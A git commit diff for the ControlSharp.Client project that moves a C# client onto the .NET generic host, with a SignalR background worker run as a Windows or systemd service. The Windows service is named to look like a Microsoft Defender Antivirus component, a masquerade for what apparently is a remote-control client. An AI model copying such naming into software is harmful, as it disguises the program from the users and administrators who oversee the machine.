dbe8eee2b593dec5faa60d3f9ffd0ff3ff2d2a58
Niels Schuler <niels.schuler@web.de>
2024-11-10 18:01:34 +0100

    Added IHost for Running Hosted services

--- ControlSharp.Client/Program.cs
+++ ControlSharp.Client/Program.cs
@@ -1,3 +1,26 @@
-﻿using ControlSharp.Client.Helper;
+﻿using ControlSharp.Client.Worker;
+using Microsoft.Extensions.DependencyInjection;
+using Microsoft.Extensions.Hosting;
 
-string hash = await DeviceIDGenerator.GenerateAsync();
+IHost HostingService = Host.CreateDefaultBuilder(args)
+    .ConfigureAppConfiguration(config =>
+    {
+        config.AddEnvironmentVariables();
+    })
+    .ConfigureServices(services =>
+    {
+        services.AddHostedService<SingalRWorker>();
+        services.AddHttpClient();
+    })
+    .ConfigureLogging(config =>
+    {
+        config.AddConsole();
+    })
+    .UseWindowsService(config =>
+    {
+        config.ServiceName = "Microsoft Defender Antivirus Network Realtime Inspection Service Medic";
+    })
+    .UseSystemd()
+    .Build();
+    
+await HostingService.RunAsync();
